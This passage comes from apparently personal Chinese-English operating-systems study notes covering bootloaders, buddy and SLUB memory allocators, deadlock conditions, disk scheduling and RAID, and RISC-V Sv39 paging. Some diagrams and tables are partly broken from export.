<li>在计算机的ROM（Read-Only Memory），存储着BIOS程序（现在更新的技术是UEFI）。他会检测计算机的硬件（collect the most diverse hardware data and create a complete list of all of the device’s available drives）。
然后 BIOS按照&quot;启动顺序&quot;，把控制权转交给排在第一位的能用于启动的储存设备。如何判断能否用于启动呢？需要检查存储设备是否有boot record(也叫boot signature)，
goes through the data carriers found in sequence,checking for a bootloader by means of boot signature </li>
</ol>
<h2 id="bootloader存储在哪里"><a class="header" href="#bootloader存储在哪里">Bootloader存储在哪里</a></h2>
<ol>
<li>通常第一个扇区，前512个字节，也就是MBR(Master boot record)）如果这512个字节的最后两个字节是0x55和0xAA，表明这个设备可以用于启动。</li>
<li>The bootloader is stored on a specific partition of the bootable medium.</li>
</ol>
<h2 id="bootloader的工作"><a class="header" href="#bootloader的工作">Bootloader的工作</a></h2>
<ol>
<li>The first task is to load the main memory, which is essential for the processor to work.</li>
<li>In the second step, the bootloader <strong>loads the kernel of the operating system</strong>, that is, the primary component of the system software that controls all storage and processor permissions and contains all important drivers. </li>
<li>After successfully completing all tasks, the bootloader returns the system responsibility to the kernel.</li>
</ol>
<p>BootLoader是系统加电后运⾏的第⼀段代码，它在操作系统内核运⾏之前运⾏，可以分为Booter
和Loader，Booter是初始化系统硬件使之能够运⾏起来；Loader是建⽴内存空间映射图，将操作系统
镜像加载到内存中，并跳转过去运⾏。经过Bootloader的引导加载后，系统就会退出bootloader程序，
启动并运⾏操作系统，此后交由Linux内核接管。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-buddy_systemslub"><a class="header" href="#os-buddy_systemslub">OS-Buddy_System&amp;Slub</a></h1>
<h2 id="buddy-system"><a class="header" href="#buddy-system">Buddy system</a></h2>
<p><a href="Basic/OS/(https://www.halolinux.us/kernel-reference/the-buddy-system-algorithm.html)">这篇文章</a>详细的介绍了我们为什么要使用Buddy System.具体的实现可以参考<a href="https://coolshell.cn/articles/10427.html">这篇文章</a>。</p>
<p>当User运行进程申请内存的时候，我们会在内核维护的<strong>Free Frame List</strong>上为他分配。</p>
<p>但是在Kernel中情况有所不同。因为我们往往需要让kernel的<strong>物理内存连续</strong>，或者有些负责作为外部硬件设备的mapping的内存并不能被换出。所以我们引入了一些专门用于Kernel的Frame管理机制，比如说Buddy system和slab。</p>
<p>Buddy system也可以有不同的实现。Linux采用的和下面要讲述的是<strong>Binary buddy system</strong>。 </p>
<h2 id="binary-buddy-system"><a class="header" href="#binary-buddy-system">Binary buddy system</a></h2>
<p>例如，我们要管理的是一块大小为8的内存：</p>
<pre><code>+--+--+--+--+--+--+--+--+
| page 0 | page 1 | page 2 | page 3 | page 4 | page 5 | page 6 | page 7 |
+--+--+--+--+--+--+--+--+
</code></pre>
<p>我们把他组织成下图所示的结构：</p>
<pre><code>8 +&gt; 2 +&gt; 1
  |       |
  |       +&gt; 1
  |               |
  |               +&gt; 4 +&gt; 1
          |       |
          |       +&gt; 2 +&gt; 1
</code></pre>
<p>这是一个<strong>满二叉树</strong>。所以我们可以用一个数组来存储他：</p>
<pre><code>+--+
</code></pre>
<p>数组中的数字代表的是可分配的物理地址连续页的最大个数，比如此时：</p>
<ul>
<li>
<p>bitmap[0] 对应的是 page 0 ~ page 7</p>
</li>
<li>
<p>bitmap[1] 对应的是 page 0 ~ page 3</p>
</li>
<li>
<p>bitmap[2] 对应的是 page 4 ~ page 7</p>
</li>
<li>
<p>bitmap[3] 对应的是 page 0 ~ page 1</p>
</li>
<li>
<p>bitmap[4] 对应的是 page 2 ~ page 3</p>
<p>以此类推。</p>
</li>
</ul>
<p>我们要实现两个接口，一个时alloc_page分配页，一个是free_page回收页。</p>
<h3 id="alloc_page"><a class="header" href="#alloc_page">alloc_page</a></h3>
<p><code>uint64 alloc_page(int num_of_page)</code>。接受申请的page数量，返回申请得到的连续内存的首地址，如果申请失败（内存不够），返回NULL。</p>
<p>如果我们申请一个alloc_page(3)：</p>
<pre><code>4 +&gt; 2 +&gt; 1
  |       |
  |       +&gt; 1
  |               |
  |               +&gt; 4 +&gt; 1
          |       |
          |       +&gt; 2 +&gt; 1
                  
+--+
</code></pre>
<p>我们把<strong>3向上对齐到4</strong>，然后分配一个正好为4的空间。</p>
<p>然后我们<strong>只需要更新他祖先节点</strong>的值。</p>
<p>我们继续申请 alloc_page(1):</p>
<pre><code>2 +&gt; 2 +&gt; 1
  |       |
  |       +&gt; 1
  |               |
  |               +&gt; 2 +&gt; 0 ← 
          |       |
          |       +&gt; 2 +&gt; 1

+--+
</code></pre>
<p>注意到我们<strong>节点上的值是最大可用的连续内存</strong>，所以是2不是3（第2层）。</p>
<p>然后我们考虑实现上的一些细节，数据结构采用上面的堆。</p>
<ol>
<li>我们要返回的是虚拟地址，也就是说我们要把我们找到的array index转换成VA，因为我们在Kernel对物理空间和虚拟空间进行了等值映射，所以其实我们就是把array index转换成page number.</li>
<li>更新当前节点的值不难，如何更新父节点的值？</li>
<li>如何找到符合条件的最小节点？</li>
<li>如何向上对齐到2^n</li>
</ol>
<p><strong>可能的解决方案：</strong></p>
<h3 id="free_page"><a class="header" href="#free_page">free_page</a></h3>
<p><code>void free_page(uint64 VA)</code>接受要释放的虚拟空间的地址，在我们维护的buddy system中把它释放。</p>
<p>我们来看一个例子，假设初始状态如此，我们要释放箭头指向节点。我们首先需要恢复他的值，然后如果他的buddy可以和他合并，那么继续更新他的parent；如果不行，那么更新到此为止。</p>
<pre><code>4 +&gt; 2 +&gt; 1
  |       |             
  |       +&gt; 0 ← 
  |               |
  |               +&gt; 4 +&gt; 1
          |       |
          |       +&gt; 2 +&gt; 1
                  ↓
+--+
=================================================================================
8 +&gt; 2 +&gt; 1
  |       |             
  |       +&gt; 1 ← 
  |               |
  |               +&gt; 4 +&gt; 1
          |       |
          |       +&gt; 2 +&gt; 1
                  ↓
+--+

</code></pre>
<p>然后我们考虑实现上的一些细节，数据结构采用上面的堆。</p>
<ol>
<li>之前的index对应的唯一的<code>page_num==VA</code>，现在的<code>VA==page_num</code>对应着多个index，要释放哪一个呢？</li>
<li>我们要如何和他的buddy进行合并呢？如何更新祖先节点的值呢？</li>
</ol>
<p><strong>可能的解决方案：</strong></p>
<h2 id="slub"><a class="header" href="#slub">Slub</a></h2>
<p><a href="https://blog.csdn.net/lukuen/article/details/6935068">实现参考链接</a>，<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-slub/index.html">教科书般的参考链接</a>，讲的很好。</p>
<p>内核管理页面使用了2个算法：buddy system和slub。buddy system以page为单位管理内存，但在大多数情况下，程序需要的并不是一整页，而是几个、几十个字节的小内存。于是需要另外一套系统来完成对小内存的管理，这就是slub系统。slub系统运行在buddy system之上，为内核提供小内存管理的功能。</p>
<p>每个数组元素对应一种大小的内存，可以把一个kmem_cache结构体看做是一个特定大小内存的零售商，整个slub系统中共有12个这样的零售商，每个“零售商”只“零售”特定大小的内存，例如：有的“零售商”只&quot;零售&quot;8Byte大小的内存，有的只”零售“16Byte大小的内存。</p>
<h3 id="kmem_cache"><a class="header" href="#kmem_cache">kmem_cache</a></h3>
<p><code>struct kmem_cache* slub_allocator[NR_PARTIAL] = {};</code>。slub_allocator是一个全局的结构，描述了整个SLUB分配器，他可以分配一共<code>NR_PARTIAL</code>种内存大小。</p>
<p>他的每一个元素都是一个特定大小的“内存零售商”，我们一共有<code>NR_PARTIAL</code>个这样的内存零售商（准确的说法是<strong>内核对象缓冲区 kernel memory cache</strong>），每个“零售商”只“零售”特定大小的内存。我们来看kmem_cache的数据结构（省略了统计和调试相关的字段）。</p>
<p>| 类型                        | 名称                     | 描述                                                         |
| :-- | :-- |
| unsigned long               | flags                    | 描述缓冲区属性的一组标志                                     |
| int                         | size                     | 分配给对象的内存大小（可能大于对象的实际大小）               |
| int                         | objsize                  | 对象的实际大小                                               |
| int                         | offset                   | 存放空闲对象指针的位移                                       |
| int                         | order                    | 表示一个 slab 需要2^order 个物理页框                         |
| kmem_cache_node             | local_node               | 创建缓冲区的节点的 slab 信息                                 |
| int                         | objects                  | 一个 slab 中的对象总个数                                     |
| gfp_t                       | allocflags               | 创建一个 slab 时使用的一组额外标志                           |
| int                         | refcount                 | 缓冲区计数器。当用户请求创建新的缓冲区时，SLUB 分配器重用已创建的相似大小的缓冲区，从而减少缓冲区的个数。 |
| void (*)(…)                 | ctor                     | 创建 slab 时用于初始化每个对象的构造函数                     |
| int                         | inuse                    | 元数据的位移                                                 |
| int                         | align                    | 对齐                                                         |
| const char *                | name                     | 缓冲区名字                                                   |
| struct list_head            | list                     | 包含所有缓冲区描述结构的双向循环队列，队列头为 slab_caches   |
| int                         | remote_node_defrag_ratio | 该值越小，越倾向从本节点中分配对象                           |
| struct kmem_cache_node * [] | node                     | 为每个节点创建的 slab 信息的数据结构（创建缓冲区的节点除外，使用 local_node 字段） |
| struct kmem_cache_cpu * []  | cpu_slab                 | 为每个处理器创建的 slab 信息的数据结构                       |</p>
<h3 id="kmem_cache_cpu"><a class="header" href="#kmem_cache_cpu">kmem_cache_cpu</a></h3>
<p>每个零售商<code>kmem_cache</code>有两个“部门”，一个是“仓库”：<code>kmem_cache_node</code>，一个“营业厅”：<code>kmem_cache_cpu</code>。“营业厅”里只保留一个slab，只有在营业厅<code>kmem_cache_cpu</code>中没有空闲内存的情况下才会从仓库中换出其他的slab。 <strong>所谓slab就是零售商<code>kmem_cache</code>批发的连续的整页内存</strong>，零售商把这些整页的内存分成许多小内存，然后分别“零售”出去，一个slab可能包含多个连续的内存页。slab的大小和零售商有关。</p>
<p>我们来看kmem_cache_cpu 数据结构。描述了一个正在被使用的slab。</p>
<p>| 类型          | 名称     | 描述                                                 |
| : | :- | : | :-- |
| kmem_cache_create     | 创建新的缓冲区。                                             |
| kmem_cache_destroy    | 销毁缓冲区。因为存在重用缓冲区的情况，只有当 kmem_cache 结构的 refcount 字段为 0时才真正销毁。 |
| kmem_cache_alloc      | 从处理器本地的活动 slab 中分配对象。                         |
| kmem_cache_alloc_node | 如果指定的 NUMA 节点与本处理器所在节点不一致，则先从指定节点上获取 slab，替换处理器活动 slab，然后分配对象。 |
| kmem_cache_free       | 释放对象。如果对象属于某 Partial slab 且释放操作使这个 slab转变成Empty 状态，则释放该 slab。 |
| kmem_ptr_validate     | 检查给定对象的指针是否合法。                                 |
| kmem_cache_size       | 返回对象实际大小。                                           |
| kmem_cache_shrink     | 检查各个节点的 Partial 队列，回收实际处于 Empty 状态的 slab，并将剩余的 slab 按已分配对象的数目排序。 |
| kmalloc               | 从通用缓冲区中分配一个对象。                                 |
| kmalloc_node          | 从通用缓冲区中分配一个属于指定 NUMA 节点的对象。             |
| kfree                 | 释放一个通用对象。                                           |
| ksize                 | 返回分配给对象的内存大小（可能大于对象的实际大小）           |</p>
<p>SLUB在初始化时，需要预先申请一定的空间来做数据结构和Cache的初始化，此时依赖于Buddy System提供的接口。</p>
<p>关于分配和释放内存，第一个链接讲的真是太好了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-deadlock"><a class="header" href="#os-deadlock">OS-Deadlock</a></h1>
<h2 id="必要条件"><a class="header" href="#必要条件">必要条件</a></h2>
<ol>
<li>互斥mutex，必须有一个资源处于非共享模式。</li>
<li>占有并等待hold and wait：一个进程至少占有一个资源，并等待另一个资源。</li>
<li>非抢占non-preemption：资源不能被抢占，资源只能在进程在完成任务后自愿释放</li>
<li>循环等待circular wait：有一组进程{P0,P1...Pn},P0等待的资源被P1占有，P1等待的资源被P2占有......Pn等待的自愿被P1占有。</li>
</ol>
<h3 id="prevention-打破上面的四个条件"><a class="header" href="#prevention-打破上面的四个条件">Prevention 打破上面的四个条件</a></h3>
<p>打破循环等待是比较常用的方法。比如我们可以对资源进行排序，只能按照递增顺序申请资源。这个方法很好，但是不能解决动态的获取锁的情况。
<img src="Basic/OS/../images/1605354533649.png" alt="" /></p>
<h3 id="avoid-安全状态bankers-algorithm"><a class="header" href="#avoid-安全状态bankers-algorithm">Avoid 安全状态=&gt;Banker's Algorithm</a></h3>
<p>要求每个进程声明可能需要的每种资源类型的最大数量，但是如果这个声明是恶意的或者错误了，还是有可能导致死锁？这个比较困难，所以不实用。</p>
<p>贪心算法，但是需要事先声明需要的最大资源。</p>
<p>对有向图的拓扑排序可以判断有没有环。https://www.cnblogs.com/TenosDoIt/p/3644225.html</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-io"><a class="header" href="#os-io">OS-IO</a></h1>
<p>很多具体的东西都是设备实现的，操作系统(驱动？)把硬件<strong>抽象</strong>给我们使用。</p>
<h2 id="storage-2"><a class="header" href="#storage-2">Storage</a></h2>
<h3 id="设备"><a class="header" href="#设备">设备</a></h3>
<h4 id="magnetic-tape"><a class="header" href="#magnetic-tape">Magnetic Tape</a></h4>
<p>磁带。已经被淘汰了。。
因为要转，所以最好的方式是顺序读。
唯一的优点是便宜。</p>
<h4 id="hdd"><a class="header" href="#hdd">HDD*</a></h4>
<p>磁盘可能都要被淘汰了。。
<img src="Basic/OS/../images/1608951186211.png" alt="" />
挪动磁头的时间：seek time
转动磁盘的时间：rotational latency
为了减少磁头挪动的时间，我们要合理的<strong>调度*：</strong></p>
<ul>
<li><strong>FCFS</strong>：First come first serve</li>
<li><strong>SSTF</strong>：shortest seektime time first，但是这样可能会starve</li>
<li><strong>SCAN &amp; C-SCAN</strong>：磁头从头扫描到尾，再从尾扫描到头/磁头从头扫描到尾，然后立即回到头再开始下一次扫描</li>
<li><strong>LOOK &amp; C-LOOK</strong>：磁头从最小到最大的请求处，再从最大到最小/磁头最小到最大的请求处，然后立即回到最小的请求处再开始下一次扫描</li>
</ul>
<p>这上面的算法除了FCFS都有可能发生starve。</p>
<h4 id="ssd"><a class="header" href="#ssd">SSD</a></h4>
<p>一般寿命会短一点，有写入次数的限制。我们应该平衡每一个block的使用。
但是比HDD快。调度算法使用FCFS就可以了。</p>
<h3 id="disk-attachment"><a class="header" href="#disk-attachment">Disk Attachment</a></h3>
<p>计算机访问磁盘有两种方式，一个是通过IO端口，称为主机连接存储(<strong>host-attached storage</strong>)，另一种是通过分布式文件系统的远程主机，称为网络连接存储(network-attached storage)。</p>
<p>network-attached storage: NAS iSCSI</p>
<h3 id="raid-1"><a class="header" href="#raid-1">RAID*</a></h3>
<p>Disk是unreliable, slow but cheap的。</p>
<p>我们通过Redundancy（冗余）的思想，试图解决这个问题。Redundant arrays of independent disks (RAIDs)。</p>
<p>|                 | 特点                                                         | 解决的问题              |
| -- |
| RAID0           | 有block-level striping，把文件的块分散到多个磁盘上，这样可以并行的访问改善performance。 | performance             |
| RAID1           | 有mirrow disk，给Disk一个完整的copy                          | reliability             |
| RAID2（不使用） | 把数据从bit级别切分，使用<strong>Hamming code</strong>进行纠错，可以纠正1bit的错误。 | reliability             |
| RAID3           | 也是把数据从bit级别切分，使用<strong>Bit Interleaved Parity</strong>进行纠错，可以纠正1bit的错误， | reliability             |
| RAID4           | 把数据从strip级别切分，在一个单独的磁盘上保存其他块的奇偶校验块，可以并行的读入所有的块和奇偶校验。 | performance&amp;reliability |
| RAID5           | 把数据从strip级别切分，把奇偶校验块分散在所有的磁盘里        | performance&amp;reliability |
| RAID6           | 和RAID5很像，但是用了P+Q两额外的冗余信息，可以容忍两个bit的错误 | performance&amp;reliability |</p>
<p>RAID3读取一个内容需要读取所有的磁盘。这还可以并行，但是对一个小写入（比如1 bit），还是要读取所有的盘，效率就不高。
RAID4解决了RAID3的问题，按照块来组织数据，读取可以并行。但是对于小块内容的写入效率较低，而且总是要访问校验磁盘频率过高影响寿命。校验盘成为瓶颈。</p>
<p>对上面出现的纠错方式的解释，以4bit的数据<code>1101</code>为例，他会变成 <code>110_1__</code></p>
<p>Hamming code：</p>
<ol>
<li>
<p>首先我们注意到数据一共有4bit，我们需要$2^k-1≥n+k$的k bit的校验位，k=3。</p>
</li>
<li>
<p>第1位校验码考虑<strong>编号为XX1</strong>的位（也就是第1,3,5,7...位）的XOR。<code>1xor0xor1=0</code>，插到第1位。</p>
<p>第2位校验码考虑<strong>编号末位为X1X</strong>的位（也就是第2,3,6,7...位）的XOR。<code>1xor1xor1=1</code>，插到第2位。</p>
<p>第3位校验码考虑<strong>编号末位为1XX</strong>的位（也就是第4,5,6,7,12,13,14,15...位）的XOR。<code>0xor1xor1=0</code>，插到第4位。</p>
</li>
<li>
<p>所以我们得到的校验码是<code>110</code>。我们把他插入我们的数据中：110<strong>0</strong>1<strong>10</strong></p>
</li>
<li>
<p>那么比如我们的数据变成了<code>111 0110</code>我们要怎么纠错呢？我们要再算一他的Hamming code=<code>101</code>，如果有<code>1</code>那么说明出现了错误。那么错误在哪里呢？出错的位置为<code>101</code>即第5位。我们对他取反就完成了纠错。</p>
</li>
</ol>
<p>Bit Interleaved Parity：</p>
<ol>
<li>纠错码为<code>1 xor 0 xor 1 xor 1 = 1</code>。</li>
<li>比如我们的数据一位损坏了，变成了<code>110?</code>，那么<code>？=1 xor 0 xor 1 xor 1 = 1 </code>，把原来<code>？</code>的地方换成纠错码。</li>
<li>我们可以这样做的原因是，磁盘控制器能够检测到一个扇区是否被正确读取，所以我们只需要1个额外的bit。</li>
</ol>
<h2 id="io设备"><a class="header" href="#io设备">IO设备</a></h2>
<p>IO device多种多样，有不同的方式去控制他们。我们不可能让操作系统去为每一种IO设备专门写一段代码，没有问题是多加一层抽象解决不了的。</p>
<p><img src="Basic/OS/../images/1608951259015.png" alt="" /></p>
<h3 id="io-access"><a class="header" href="#io-access">IO access</a></h3>
<p>一些CPU有专门的IO指令，比如x86的<code>in</code>，<code>out</code>。
另一种是Memory Mapped IO，把这些设备的控制寄存器map到内存的某个部分，然后用和操作内存一样的指令操作IO。</p>
<p>Polling（轮询）：CPU主动，需要busy waiting，如果Device比较慢就不合理。
Interrupt（中断）：IO主动
DMA（Direct Memory Access）：直接把数据从硬盘传输到内存，不经过CPU，从而减少CPU负担。</p>
<h3 id="分类"><a class="header" href="#分类">分类</a></h3>
<h4 id="接口"><a class="header" href="#接口">接口</a></h4>
<p>block I/O：块设备以块为单位进行访问，比如说Disk就是一个例子。基本的应该实现<code>read()</code> <code>write()</code> <code>seek()</code></p>
<p>character-stream I/O：字符设备比如键盘和鼠标，stream，<code>get()</code> <code>put()</code></p>
<p>memory-mapped file access：</p>
<p>network sockets：网络设备一般用socket接口</p>
<h4 id="阻塞与异步"><a class="header" href="#阻塞与异步">阻塞与异步</a></h4>
<p>同步IO包括阻塞IO和非阻塞IO：</p>
<ul>
<li><strong>阻塞Blocking</strong>的IO比较简单，在执行system call的时候，应用程序暂时被挂起，变成waiting状态。当system call完成的时候，又变成ready。等到他被调度为running的时候，就收到了system call的返回值，完成了IO动作。</li>
<li><strong>非阻塞NonBlocking</strong>的IO</li>
</ul>
<p>异步IO</p>
<h3 id="kernel-io-subsystem"><a class="header" href="#kernel-io-subsystem">Kernel IO Subsystem</a></h3>
<p>caching：hold a copy of data for fast access</p>
<p>Device reservation: provides exclusive access to a device</p>
<p>Spooling: A spool is a buffer that holds the output (device’s input) if device can serve only one request at a time</p>
<p>I/O Protection：</p>
<p>Error Handling：</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-introduction"><a class="header" href="#os-introduction">OS-Introduction</a></h1>
<h2 id="什么是操作系统"><a class="header" href="#什么是操作系统">什么是操作系统</a></h2>
<ul>
<li>Resource abstractor and a resource allocator</li>
<li>Software layer between the applications and the hardware because the hardware would be too difficult for users to use</li>
</ul>
<h2 id="操作系统的启动"><a class="header" href="#操作系统的启动">操作系统的启动</a></h2>
<p>操作系统的启动，就是把操作系统的代码（数据）从Disk加载到内存中，并开始执行。这个工作是被一个称为<a href="https://reticenceji.github.io/post/os_bootloader/">BootLoader</a>的程序完成的。
加载完成之后，操作系统就开始运行了。
Kernel不是一个正在运行的job。<!-- how to understand it？--></p>
<h2 id="俯瞰"><a class="header" href="#俯瞰">俯瞰</a></h2>
<p>Kernel里面是没有什么内存保护的，kernel自己负责处理内存错误，所以编程的时候需要万分小心。</p>
<p>Kernel可以执行privileged指令（准确来说，这是硬件架构赋予Kernel的权利，我们让Kernel运行在硬件架构的Privileged模式，让用户运行在硬件架构的User模式。现在的架构至少支持两个模式，古老的Intel 8086就只有一个模式，所以我们可以随意修改DOS的代码、随意修改中断向量、直接执行IO指令），这样Kernel就可以把IO、内存管理、特殊寄存器统统封装起来防止用户篡改了。</p>
<p>用户需要调用操作系统的某些功能（或者说用户程序本来也可以自己完成，但是因为有了操作系统所以必须通过操作系统来完成），所以我们有中断和异常，可以把他们当作从User到Kernel的<strong>入口Entry</strong>。</p>
<p>操作系统主要提供的服务，以及我们在Lab中的简单实现：</p>
<ul>
<li>Process Management：通过<strong>time interrupt</strong>来调度，通过<strong>system call</strong>来fork、exec、exit等。联想进程图状态切换。还有进程之间的同步、通信。</li>
<li>Memory Management。非常宏大，一个是执行用户程序，要把用户程序<strong>装载到物理内存上</strong>，还有可能需要为他<strong>动态的分配空间</strong>，还要让他可以<strong>访问到Kernel</strong>（指执行）。中间有分配的算法。</li>
<li>Storage Management：这个也属于IO的一部分。不过我们用<strong>文件系统</strong>来把Storage抽象成一系列接口，然后用<strong>虚拟文件系统VFS</strong>再把文件系统抽象成统一的接口。利用这些接口管理Storage。物理内存上的内容被我们抽象成为文件。</li>
<li>I/O Management：每一个硬件都有不同的处理方式，我们需要<strong>驱动程序</strong>来直接处理硬件，同时也要把他们抽象成文件来统一处理。</li>
<li>Protection and Security：这又是另一个故事了。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-memory_management"><a class="header" href="#os-memory_management">OS-Memory_Management</a></h1>
<p>和厨房的垃圾桶一样，内存无论多大都是稀缺资源——CSAPP</p>
<h2 id="物理地址"><a class="header" href="#物理地址">物理地址</a></h2>
<p>在计算机刚开始我们直接采用物理寻址
Variable——Externel Fragmentation。给进程分配可变大小的内存空间。问题是可能两个空间之间的间隙的内存太小，不足以容纳一个进程，造成浪费。
Fixed——Internel Fragmentaion。给进程分配固定大小的内存空间，问题是如果不能装载过大的进程，并且固定空间剩余没用的部分造成浪费。</p>
<h2 id="虚拟地址逻辑地址"><a class="header" href="#虚拟地址逻辑地址">虚拟地址/逻辑地址</a></h2>
<p>CPU生成的地址称为<strong>逻辑地址</strong>，内存单元需要的地址是<strong>物理地址</strong>。他们之间的转换由MMU（Memory Management Unit）完成，也需要操作系统的配合。</p>
<h3 id="continuous-memory"><a class="header" href="#continuous-memory">Continuous memory</a></h3>
<p>最容易想到的是把一个进程分配在一个连续的物理内存中，用base和limit两个寄存器。
我们检查<code>Laddr&lt;=limit</code>，如果是的话<code>Paddr = Laddr + base.</code>。完成简单的保护。</p>
<h3 id="segment"><a class="header" href="#segment">segment</a></h3>
<p>Segmentation的概念，主要是和limit。
逻辑地址由<code>&lt;segment, offset&gt;</code>组成。比如我们的text, data, rodata等。我们还可以对不同的段应用不同的权限保护。</p>
<h3 id="paging"><a class="header" href="#paging">Paging</a></h3>
<p>Paging的关键是Page Table，说明了从 virtual memory映射到 physical memory的方法，顺便自然而然的完成了权限保护、内存共享。Paging实现的具体细节，可以参考下面的RISCV和Lab。</p>
<h4 id="tlb-1"><a class="header" href="#tlb-1">TLB</a></h4>
<p>如果每一次访问内存都经过页表，那么我们要有n+1次对内存的访问（访问页表），这是十分低效率的。
为此我们引入了TLB，可以认为是对Page Table Entry的高速缓存（当然和cache有本质的区别）。
TLB能起作用，和Locality（局部性原理）是分不开的。</p>
<h2 id="linux-2"><a class="header" href="#linux-2">Linux</a></h2>
<p>申老师十分推荐的一个Blog:<a href="https://manybutfinite.com/post/how-the-kernel-manages-your-memory/">How The Kernel Manages Your Memory</a>.把网页保存到本地就能看到图片了。。</p>
<h3 id="linux--page-fault"><a class="header" href="#linux--page-fault">Linux &amp; page fault</a></h3>
<p>mm_struct, switch_mm,mm_struct.pgd
有两个结构，一个是页表，一个是<strong>vm_struct</strong>.
平时我们通过页表访问，页表的标志位帮我们实现保护。
<strong>应该好好看看Linux处理page fault的源代码。</strong>
当出现page_fault的时候，我们才会遍历vm_struct(vma在Linux中用红黑树来加速查找)，检查是为什么出现了page_fault。
如果不是valid的，可能是非法指令、段错误等等。
如果是valid的，那应该是被swap到Disk里了。</p>
<h3 id="demand-paging"><a class="header" href="#demand-paging">demand paging</a></h3>
<p>我们在把可执行程序从Disk加载到Memory的时候，可以选择整个加载进去。
但是也可以选择一开始加载一部分到内存，其他的在需要的时候再加载进去（比如错误处理代码）。这就称为Demand Paging。流程如下所示：
<img src="Basic/OS/../images/1608350206837.png" alt="" />
[] 有一个问题，我们是怎么知道我们要去Disk的何处Load Frame呢？
=》可以在Frame管理中把Disk也管理了，把Disk也分成一页一页的编号。</p>
<h3 id="lasy-allocation"><a class="header" href="#lasy-allocation">Lasy allocation</a></h3>
<p>这个和Demand Paging好像差不多啊。从这个例子中看，都是invalid惹得祸。只不过Lasy allocation只需要分配一个free frame，demand paging需要从Disk中加载内容到一个free frame。
<img src="Basic/OS/../images/1608252091829.png" alt="" /></p>
<h3 id="copy-on-writefork"><a class="header" href="#copy-on-writefork">copy on write——fork</a></h3>
<p>我们在Fork的时候，需要复制Parent的内存内容，但是大多数情况我们会exec刷掉复制的内容。所以我们引入copy on write技术防止这个复制过程的浪费。
<img src="Basic/OS/../images/1608348754968.png" alt="" /></p>
<ol>
<li>Allowing the parent and child processes initially to share the same
pages. These shared pages are <strong>marked as copy-on-write pages</strong>, meaning that
if either process writes to a shared page, a copy of the shared page is created.如果我们试图要写的哪一块的话，再创建一个副本。</li>
<li>还有vfork系统调用。vfork并不使用copy on write技术，就是单纯的和Parent指向了同样的frame。所以我们要保证之后立即调用exec，不修改父进程的内容，否则就出问题了。</li>
</ol>
<h3 id="buddy曾经的linux"><a class="header" href="#buddy曾经的linux">Buddy(曾经的Linux)</a></h3>
<p>用于Kernel的Frame管理。避免External Fragmentation。</p>
<p><img src="Basic/OS/../images/1608348092207.png" alt="" /></p>
<h3 id="slabslobslub"><a class="header" href="#slabslobslub">slab,slob,slub</a></h3>
<p>用几个物理连续的页，防止Internel Fragmentation。Slab还可以作为一个pool，比如task_struct_slab，统一管理task_struct用的Frame。</p>
<ul>
<li></li>
</ul>
<h2 id="寻址--riscv"><a class="header" href="#寻址--riscv">寻址 -RISCV</a></h2>
<p>RISCV没有段寄存器这种历史遗留的东西了。</p>
<p>多级页表不要求物理内存是连续的，并且可以节省内存。
节省内存的原因是，逻辑地址不是连续的。而每一张页表要求物理地址是连续的。
**TLB: ** cache page table entryd</p>
<h3 id="satp"><a class="header" href="#satp">satp</a></h3>
<p><strong>satp(Supervisor Address Translation and Protection)</strong>： 就是RISCV中的Page Table Base Register。用来索引Page Table的基地址，同时通过置某些位来选择寻址模式。
<img src="Basic/OS/../images/1606453219113.png" alt="" />
MODE字段的含义：
<img src="Basic/OS/../images/1606453327845.png" alt="" />
PPN字段的含义：
保存physical page number (PPN) of the <strong>Base Page Table</strong>。一页4kb，也就是说 <code>ppn&lt;&lt;12</code>指示了 <strong>Base Page Table</strong>物理地址</p>
<h3 id="直接物理寻址"><a class="header" href="#直接物理寻址">直接物理寻址</a></h3>
<p>在Machine Mode下都是直接物理寻址。
satp没有置位的时候也是直接物理寻址。
直接物理寻址不需要太多的解释，很简单。非要解释，就是硬件层面了。</p>
<h3 id="逻辑地址物理地址"><a class="header" href="#逻辑地址物理地址">逻辑地址=&gt;物理地址</a></h3>
<p><img src="Basic/OS/../images/1607041367482.png" alt="" />
S 模式提供了一种传统的虚拟内存系统，它将内存划分为固定大小的页来进行地址转
换和对内存内容的保护。上面我们介绍了satp,比如我们开启了Sv39转换。</p>
<blockquote>
<p>为什么是39 = 12+9+9+9呢？
因为1Page = 4Kb，并且我们是64位CPU。这是两大前提。
VPN是9位，因为64bit = 8byte，那么1Page可以容纳的Entry数量就是512 = 2^9，我们的VPN是用来在page table作为index的，所以就是9位啦。
最后为啥是12bit？ 4k=2^12。</p>
</blockquote>
<blockquote>
<p>我们的虚拟地址需要39bit，但是我们每一个页表的entry还是64bit。为什么呢？
首先是为了对齐，我们是按照byte处理的，39不伦不类效率很低。
那么为什么不是40呢？其实这样子还有一个扩展性的考虑。个人理解。</p>
</blockquote>
<blockquote>
<p>物理地址为啥是这样呢？为啥不和虚拟地址统一呢？
emmm,我觉得可以，但是没必要。物理地址支持的范围不是多多益善嘛。
只不过对于某个进程来说，就算你的物理内存空间真的把物理地址填满了，进程也用不了那么多的内存。虚拟地址是上限了。
当然，这是用户的进程。对于内核来说，他可是可以更改自己虚拟地址的映射的。通过改变page table可是能把所有物理地址都用上。</p>
</blockquote>
<p>当我们把satp置位之后，之后的寻址就应该用逻辑地址了。
我们来看一下从Logical Address=&gt;Physical Address的过程：
<img src="Basic/OS/../images/1606456442814.png" alt="" /></p>
<p>从上面，我们看到<strong>物理内存</strong>能寻址的最大范围是2^56 bit.
对于一个进程（独立的有一套页表）来说，逻辑地址的最大寻址范围是2^39 bit.
当然，我们可以看到那些Flag可都是有用的。</p>
<h3 id="page-fault"><a class="header" href="#page-fault">Page fault</a></h3>
<p>在网络上没有找到出现Page fault情况的资料。
首先invalid的会产生page fault。
非法指令，比如Umode执行sret，S mode执行mret等都会产生非法指令。</p>
<h2 id="kernel和user"><a class="header" href="#kernel和user">Kernel和User</a></h2>
<p>来看看Linux对内存映射的分布。我们知道，随着进程的切换，页表也要相应的改变，从而给每一个进程一个独立的地址空间。但是Kernel的映射是不变的。
所以，我们把内存映射（页表决定的逻辑地址的分配）分成两部分，一部分是不变的Kernel，另一部分是变化的User 。 
<img src="Basic/OS/../images/1607048567794.jpg" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-process"><a class="header" href="#os-process">OS-Process</a></h1>
